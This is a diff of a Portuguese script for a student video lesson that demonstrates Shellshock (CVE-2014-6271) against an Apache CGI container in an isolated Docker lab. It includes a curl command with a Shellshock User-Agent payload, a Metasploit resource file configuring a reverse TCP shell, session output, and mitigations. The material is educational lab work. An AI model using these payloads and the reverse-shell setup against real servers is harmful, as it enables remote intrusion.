@@ -1,39 +1,66 @@
 # Roteiro da videoaula - Shellshock com Metasploit
 
-Duracao alvo: 20 minutos.
+Duracao alvo: 20 minutos  
+Formato: apresentacao dividida entre 3 pessoas  
+Tema: exploracao controlada da vulnerabilidade Shellshock (CVE-2014-6271) com
+Apache CGI, Docker e Metasploit
 
-Tema: exploracao controlada da vulnerabilidade Shellshock (CVE-2014-6271) em
-um servidor Apache CGI vulneravel, usando Docker e Metasploit.
+## Divisao geral
+
+- Pessoa 1: introducao, conceito da vulnerabilidade e padrao de ataque
+- Pessoa 2: ambiente Docker, vitima, validacao normal e prova manual
+- Pessoa 3: Metasploit, shell reversa, mitigacoes e fechamento
+
+## Preparacao antes de gravar
+
+Deixar o laboratorio pronto ou iniciar a gravacao com o build:
+
+```bash
+docker compose up --build
+```
+
+Usar outro terminal para os comandos `docker exec`.
+
+Arquivos que podem ser deixados abertos no editor:
+
+- `README.md`
+- `docs/relatorio.md`
+- `docker-compose.yml`
+- `victim/Dockerfile`
+- `victim/cgi/status.cgi`
+- `metasploit/shellshock.rc`
 
 ## 0:00 - 1:00 | Abertura
 
+Responsavel: Pessoa 1
+
 ### O que mostrar
 
-- Tela inicial do projeto.
-- Arquivos principais:
-  - `docker-compose.yml`
-  - `victim/Dockerfile`
-  - `victim/cgi/status.cgi`
-  - `metasploit/shellshock.rc`
-  - `docs/relatorio.md`
+- Tela do projeto no editor.
+- `README.md` ou estrutura de arquivos.
 
 ### Fala sugerida
 
-Neste video vamos demonstrar um ataque Shellshock em ambiente controlado. A
-vitima e um container com Apache CGI executando um script interpretado por uma
-versao vulneravel do Bash. O atacante e outro container com Metasploit. O
-objetivo e mostrar o conceito da vulnerabilidade, validar manualmente a falha,
-executar o exploit via Metasploit e discutir mitigacoes.
+Neste video vamos apresentar um pentest em ambiente controlado usando
+Metasploit. O ataque escolhido explora a vulnerabilidade Shellshock,
+identificada como CVE-2014-6271.
 
-Importante deixar claro que o ataque e feito apenas em rede isolada de
-laboratorio, contra uma vitima criada especificamente para o trabalho.
+Nosso laboratorio tem dois containers: uma maquina atacante com Metasploit e
+uma vitima com Apache CGI executando um script por uma versao vulneravel do
+Bash. A demonstracao sera feita apenas nessa rede isolada de laboratorio.
 
-## 1:00 - 3:30 | Conceito do ataque
+Ao longo do video vamos explicar o conceito da falha, mostrar a validacao
+manual, executar o exploit via Metasploit e finalizar com estrategias de
+mitigacao.
+
+## 1:00 - 4:00 | Conceito da vulnerabilidade
+
+Responsavel: Pessoa 1
 
 ### O que mostrar
 
-- Secao `Padrao de ataque` em `docs/relatorio.md`.
-- Padrao:
+- Secao de vulnerabilidade em `docs/relatorio.md`.
+- Padrao Shellshock:
 
 ```text
 () { :;}; comando_malicioso
@@ -41,42 +68,60 @@ laboratorio, contra uma vitima criada especificamente para o trabalho.
 
 ### Fala sugerida
 
-Shellshock e uma vulnerabilidade do GNU Bash registrada como CVE-2014-6271. Ela
-ocorre porque versoes vulneraveis do Bash interpretam de forma incorreta
-variaveis de ambiente que parecem definicoes de funcao.
+Shellshock e uma vulnerabilidade do GNU Bash. Ela acontece em versoes que
+importam variaveis de ambiente de forma insegura. O Bash permite exportar
+funcoes por variaveis de ambiente, mas as versoes vulneraveis tambem executam
+comandos extras colocados depois da definicao da funcao.
 
-O padrao usado no ataque e uma falsa funcao:
+O padrao do ataque e este:
 
 ```text
 () { :;}; comando_malicioso
 ```
 
-A parte `() { :;};` parece uma definicao de funcao para o Bash vulneravel. O
-problema e que tudo que vem depois tambem pode ser executado como comando.
+A primeira parte parece uma funcao. O problema e que o trecho depois do ponto e
+virgula tambem pode ser interpretado e executado.
 
-Em servidores CGI, cabecalhos HTTP como `User-Agent`, `Cookie` e `Referer` sao
-convertidos em variaveis de ambiente. Assim, se um CGI for executado por um Bash
-vulneravel, um cabecalho HTTP pode virar uma forma de execucao remota de
-comandos.
+No nosso caso, a superficie vulneravel e o Apache CGI. Em CGI, cabecalhos HTTP
+como `User-Agent`, `Cookie` e `Referer` podem virar variaveis de ambiente, como
+`HTTP_USER_AGENT`. Se o CGI for executado por um Bash vulneravel, um dado vindo
+do cabecalho HTTP pode virar comando no servidor.
 
-## 3:30 - 5:30 | Ambiente controlado
+### Transicao para Pessoa 2
+
+Agora que o conceito do Shellshock foi explicado, vamos mostrar como montamos o
+ambiente controlado para reproduzir a falha.
+
+## 4:00 - 6:30 | Ambiente controlado
+
+Responsavel: Pessoa 2
 
 ### O que mostrar
 
 - `docker-compose.yml`
-- Rede e IPs:
-  - atacante: `172.28.0.10`
-  - vitima: `172.28.0.20`
-  - rede: `pentest_net`, interna
+- `victim/Dockerfile`
+- `victim/cgi/status.cgi`
+
+### Pontos para comentar
+
+- Atacante: `172.28.0.10`
+- Vitima: `172.28.0.20`
+- Rede: `pentest_net`
+- A rede e interna.
+- A vitima usa Apache CGI e Bash vulneravel.
 
 ### Fala sugerida
 
-O laboratorio usa Docker Compose com dois containers. O container `attacker`
-tem o Metasploit Framework e fica no IP `172.28.0.10`. O container `victim`
-executa Apache CGI com Bash 4.3 vulneravel e fica no IP `172.28.0.20`.
+O laboratorio foi criado com Docker Compose. Temos o container `attacker`, que
+usa uma imagem baseada no Metasploit Framework, e o container `victim`, que
+executa Apache com CGI habilitado.
 
-A rede e marcada como `internal: true`, entao a comunicacao fica restrita ao
-ambiente do laboratorio. Isso ajuda a manter o experimento controlado.
+O atacante usa o IP `172.28.0.10`, e a vitima usa o IP `172.28.0.20`. Os dois
+ficam na rede `pentest_net`, configurada como interna. Isso limita a
+demonstracao ao ambiente do trabalho.
+
+Na vitima, o script `status.cgi` e interpretado por uma versao vulneravel do
+Bash. Esse script e o endpoint que sera acessado pelo atacante.
 
 ### Comando
 
@@ -95,20 +140,21 @@ Container victim                Recreated
 Attaching to attacker, victim
 ```
 
-### Observacao para falar
+### Observacao
 
-O Apache pode mostrar um aviso de `ServerName`. Esse aviso nao impede a
-demonstracao.
+Se aparecer o aviso abaixo, explicar que ele nao impede o laboratorio:
 
 ```text
 apache2: Could not reliably determine the server's fully qualified domain name
 ```
 
-## 5:30 - 7:30 | Validacao normal da vitima
+## 6:30 - 8:30 | Validacao normal da vitima
+
+Responsavel: Pessoa 2
 
 ### O que mostrar
 
-- Terminal em outro shell WSL.
+- Terminal com comando `curl`.
 
 ### Comando
 
@@ -126,16 +172,21 @@ Server time: Mon Jun 15 17:05:15 UTC 2026
 
 ### Fala sugerida
 
-Antes de explorar, verificamos se o CGI responde normalmente. A resposta mostra
-que o script esta rodando como `www-data`, que e o usuario do Apache. Isso e
-importante porque, se o ataque funcionar, os comandos tambem serao executados
-com esse nivel de privilegio.
+Antes de explorar, verificamos se a vitima esta acessivel. A resposta mostra
+que o CGI executou corretamente e que ele roda como `www-data`, usuario comum
+do servidor web.
 
-## 7:30 - 10:00 | Prova manual da vulnerabilidade
+Essa informacao e importante porque mostra o nivel de privilegio que o atacante
+tera caso consiga executar comandos. O ataque compromete o processo web, mas
+nao fornece root automaticamente.
+
+## 8:30 - 11:00 | Prova manual da vulnerabilidade
+
+Responsavel: Pessoa 2
 
 ### O que mostrar
 
-- Comando `curl` com cabecalho `User-Agent` malicioso.
+- Terminal com `curl` usando `User-Agent` malicioso.
 - Checagem do arquivo criado na vitima.
 
 ### Comandos
@@ -145,13 +196,11 @@ docker exec -it attacker curl -H 'User-Agent: () { :;}; /bin/touch /tmp/shellsho
 docker exec -it victim ls -l /tmp/shellshock-proof
 ```
 
-### Saida observada
+### Saidas observadas
 
 ```text
 500 Internal Server Error
 ```
-
-E depois:
 
 ```text
 -rw-r--r-- 1 www-data www-data 0 Jun 15 17:05 /tmp/shellshock-proof
@@ -159,24 +208,31 @@ E depois:
 
 ### Fala sugerida
 
-Aqui enviamos um `User-Agent` contendo o padrao do Shellshock. O comando
-injetado e simples e inofensivo para a demonstracao: ele cria o arquivo
-`/tmp/shellshock-proof` na vitima.
+Aqui fazemos a prova manual da falha. O cabecalho `User-Agent` recebe o padrao
+do Shellshock e, depois dele, o comando `/bin/touch /tmp/shellshock-proof`.
 
-Mesmo que o Apache responda `500 Internal Server Error`, a exploracao funcionou,
-porque o segundo comando mostra que o arquivo foi criado. O dono do arquivo e
-`www-data`, confirmando que o comando foi executado pelo processo web.
+O Apache respondeu `500 Internal Server Error`, mas isso nao significa que a
+exploracao falhou. A prova e o segundo comando: o arquivo foi criado dentro da
+vitima e pertence ao usuario `www-data`.
 
-Esse teste manual e util porque mostra a vulnerabilidade sem depender ainda do
-Metasploit.
+Isso confirma que o conteudo do cabecalho HTTP foi transformado em variavel de
+ambiente, interpretado pelo Bash vulneravel e executado como comando no
+servidor.
 
-## 10:00 - 12:00 | Configuracao do exploit no Metasploit
+### Transicao para Pessoa 3
+
+Agora que a vulnerabilidade foi comprovada manualmente, vamos automatizar a
+exploracao usando o Metasploit.
+
+## 11:00 - 13:00 | Configuracao do Metasploit
+
+Responsavel: Pessoa 3
 
 ### O que mostrar
 
 - Arquivo `metasploit/shellshock.rc`.
 
-### Conteudo importante
+### Conteudo do arquivo
 
 ```text
 use exploit/multi/http/apache_mod_cgi_bash_env_exec
@@ -193,18 +249,20 @@ run
 
 ### Fala sugerida
 
-O modulo usado e `exploit/multi/http/apache_mod_cgi_bash_env_exec`. Ele explora
-a injecao em variaveis de ambiente via Apache CGI.
+O modulo usado no Metasploit e
+`exploit/multi/http/apache_mod_cgi_bash_env_exec`. Ele foi feito para explorar
+injecao de comandos em variaveis de ambiente no Apache CGI.
 
-O `RHOSTS` aponta para a vitima, `172.28.0.20`. O `TARGETURI` aponta para o CGI
-vulneravel, `/cgi-bin/status.cgi`. O payload escolhido e
-`generic/shell_reverse_tcp`, que abre uma shell reversa da vitima para o
-atacante.
+O `RHOSTS` e o alvo, ou seja, a vitima no IP `172.28.0.20`. O `TARGETURI`
+aponta para `/cgi-bin/status.cgi`, que e o CGI vulneravel.
 
-O `LHOST` e o IP do atacante na rede Docker, `172.28.0.10`, e o `LPORT` e a
-porta que vai receber a conexao reversa.
+O payload usado e `generic/shell_reverse_tcp`. Ele faz a vitima iniciar uma
+conexao de volta para o atacante. Por isso configuramos `LHOST` como
+`172.28.0.10`, que e o IP do container atacante, e `LPORT` como `4444`.
 
-## 12:00 - 15:00 | Execucao do Metasploit
+## 13:00 - 16:00 | Execucao do exploit
+
+Responsavel: Pessoa 3
 
 ### O que mostrar
 
@@ -216,7 +274,7 @@ porta que vai receber a conexao reversa.
 docker exec -it attacker /usr/src/metasploit-framework/msfconsole -r /workspace/metasploit/shellshock.rc
 ```
 
-### Saida esperada/observada
+### Saida observada
 
 ```text
 use exploit/multi/http/apache_mod_cgi_bash_env_exec
@@ -237,27 +295,32 @@ run
 
 ### Fala sugerida
 
-O `check` do modulo confirmou que o alvo e vulneravel. Em seguida, o `run`
-executou o exploit, iniciou um handler TCP reverso no atacante e abriu uma
-sessao de shell.
+O Metasploit primeiro executa o `check`, que confirmou que o alvo e vulneravel.
+Depois, ao executar o `run`, ele iniciou o handler da shell reversa no atacante,
+enviou o stager para a vitima e abriu a sessao.
 
-Essa linha e a prova principal da exploracao via Metasploit:
+A linha mais importante para a demonstracao e:
 
 ```text
 Command shell session 1 opened
 ```
 
-Se o Metasploit voltar para o prompt `msf6`, entramos na sessao com:
+Ela confirma que o exploit via Metasploit funcionou e que uma shell foi aberta
+entre a vitima e o atacante.
+
+Se o Metasploit voltar para o prompt `msf6`, entrar na sessao com:
 
 ```text
 sessions -i 1
 ```
 
-## 15:00 - 16:30 | Demonstracao da sessao obtida
+## 16:00 - 17:30 | Demonstracao da shell obtida
+
+Responsavel: Pessoa 3
 
 ### O que mostrar
 
-- Comandos dentro da shell obtida.
+- Comandos dentro da sessao.
 
 ### Comandos
 
@@ -270,77 +333,102 @@ cat /etc/os-release
 
 ### Fala sugerida
 
-Agora os comandos sao executados dentro da vitima. O comando `id` deve mostrar
-o usuario `www-data`, que confirma que a execucao remota acontece com os
-privilegios do servidor web. O `hostname` identifica o container da vitima, e o
-`cat /etc/os-release` mostra o sistema usado no laboratorio.
+Com a sessao aberta, esses comandos sao executados na vitima. O `id` deve
+mostrar o usuario `www-data`, confirmando que obtivemos execucao remota com os
+privilegios do processo web.
 
-O ataque nao da root automaticamente. Ele da execucao remota como o usuario do
-servico vulneravel. Ainda assim, isso ja e grave: um atacante poderia ler
-arquivos acessiveis ao servidor web, movimentar-se pelo ambiente, baixar outros
-payloads ou tentar escalar privilegios.
+O `hostname` ajuda a mostrar que estamos no container da vitima, e
+`cat /etc/os-release` identifica o sistema usado no laboratorio.
 
-## 16:30 - 18:30 | Mitigacoes e defesas
+Esse acesso nao e root, mas ja representa comprometimento do servidor web. Em
+um ambiente real, um atacante poderia usar esse ponto inicial para coletar
+arquivos acessiveis, baixar outros payloads ou tentar escalar privilegios.
 
-### O que mostrar
+## 17:30 - 19:15 | Mitigacoes e defesas
 
-- Secao de defesas do relatorio.
-
-### Fala sugerida
-
-A principal mitigacao e atualizar o Bash para uma versao corrigida. Shellshock
-foi corrigido em 2014, entao sistemas atualizados nao deveriam aceitar esse
-padrao de variavel de ambiente.
-
-Outra defesa e remover CGI quando ele nao for necessario. CGI e uma superficie
-classica para esse tipo de ataque porque transforma dados da requisicao HTTP em
-variaveis de ambiente.
-
-Tambem e importante executar o servidor web com usuario de baixo privilegio,
-como ocorreu no laboratorio com `www-data`. Isso nao impede a exploracao, mas
-limita o impacto inicial.
-
-Defesas complementares incluem:
-
-- WAF ou reverse proxy filtrando cabecalhos suspeitos.
-- Restricao de trafego de saida, dificultando shells reversas.
-- Segmentacao de rede.
-- Monitoramento de logs HTTP.
-- AppArmor, SELinux ou perfis seccomp para limitar processos.
-
-## 18:30 - 20:00 | Fechamento
+Responsavel: Pessoa 3
 
 ### O que mostrar
 
-- Resumo do fluxo no `README.md`.
-- Arquivos que serao entregues.
+- Secao 8 do `docs/relatorio.md`.
 
 ### Fala sugerida
 
-Neste laboratorio, primeiro validamos o funcionamento normal do CGI. Depois
-provamos manualmente a vulnerabilidade criando um arquivo na vitima por meio de
-um cabecalho HTTP malicioso. Por fim, usamos o Metasploit com o modulo
-`apache_mod_cgi_bash_env_exec` e o payload `generic/shell_reverse_tcp`, obtendo
-uma shell reversa.
+A defesa principal contra Shellshock e atualizar o Bash. Sistemas corrigidos
+nao executam comandos extras depois de uma definicao de funcao em variaveis de
+ambiente.
 
-O ponto central do ataque e que dados controlados pelo cliente, como
-`User-Agent`, foram transformados em variaveis de ambiente e interpretados por
-um Bash vulneravel.
+Outra medida importante e remover ou restringir CGI. CGI aumenta a superficie
+de ataque porque transforma informacoes da requisicao HTTP em variaveis de
+ambiente.
 
-Como mitigacao, a defesa mais importante e atualizar o Bash e reduzir a
-superficie CGI. Em um ambiente real, tambem seriam importantes segmentacao,
-controle de saida de rede, monitoramento e hardening do servico web.
+Tambem e essencial aplicar o principio do menor privilegio. No nosso
+laboratorio, o comando executou como `www-data`, o que limita o impacto inicial.
 
-## Checklist para gravacao
+Defesas complementares incluem WAF ou reverse proxy para filtrar cabecalhos
+suspeitos, restricao de conexoes de saida para dificultar shells reversas,
+segmentacao de rede, monitoramento de logs HTTP e hardening com AppArmor,
+SELinux ou seccomp.
 
-- Deixar `docker compose up --build` rodando em um terminal.
-- Usar outro terminal para os comandos `docker exec`.
-- Mostrar a resposta normal do CGI.
-- Mostrar o `500 Internal Server Error` e explicar que a prova e o arquivo
-  criado.
+## 19:15 - 20:00 | Fechamento
+
+Responsavel: Pessoa 1
+
+### O que mostrar
+
+- `README.md`
+- `docs/relatorio.md`
+- `docs/roteiro-video.md`
+
+### Fala sugerida
+
+Neste trabalho, demonstramos o ciclo completo de um ataque Shellshock em
+ambiente controlado. Primeiro explicamos a falha no Bash e sua relacao com CGI.
+Depois validamos manualmente a vulnerabilidade criando um arquivo na vitima.
+Por fim, usamos o Metasploit para abrir uma shell reversa.
+
+O ponto central e que um dado vindo do cliente, como o cabecalho `User-Agent`,
+foi tratado como variavel de ambiente e interpretado por uma versao vulneravel
+do Bash.
+
+Como conclusao, a defesa mais efetiva e atualizar o Bash, remover superficies
+desnecessarias como CGI e aplicar camadas complementares de protecao e
+monitoramento.
+
+## Checklist por pessoa
+
+### Pessoa 1
+
+- Abrir apresentacao.
+- Explicar Shellshock.
+- Explicar o padrao `() { :;}; comando`.
+- Fazer o fechamento.
+
+### Pessoa 2
+
+- Explicar `docker-compose.yml`.
+- Mostrar atacante, vitima, IPs e rede interna.
+- Executar validacao normal com `curl`.
+- Executar prova manual com `User-Agent`.
+- Explicar o `500 Internal Server Error` e o arquivo criado.
+
+### Pessoa 3
+
+- Explicar `metasploit/shellshock.rc`.
+- Executar o Metasploit.
 - Mostrar `The target is vulnerable`.
 - Mostrar `Command shell session 1 opened`.
-- Entrar na sessao com `sessions -i 1`, se necessario.
-- Executar `id`, `hostname`, `pwd` e `cat /etc/os-release`.
-- Encerrar explicando mitigacoes.
+- Entrar na sessao, se necessario.
+- Executar comandos demonstrativos.
+- Explicar mitigacoes.
+
+## Checklist tecnico antes da gravacao
+
+- Confirmar que o Docker esta usando o contexto correto.
+- Subir o laboratorio com `docker compose up --build`.
+- Abrir um segundo terminal para os comandos `docker exec`.
+- Confirmar que `curl http://172.28.0.20/cgi-bin/status.cgi` responde.
+- Confirmar que `/tmp/shellshock-proof` pode ser criado.
+- Confirmar que o Metasploit abre a shell reversa.
+- Manter os arquivos `README.md`, `relatorio.md` e `shellshock.rc` abertos.
 
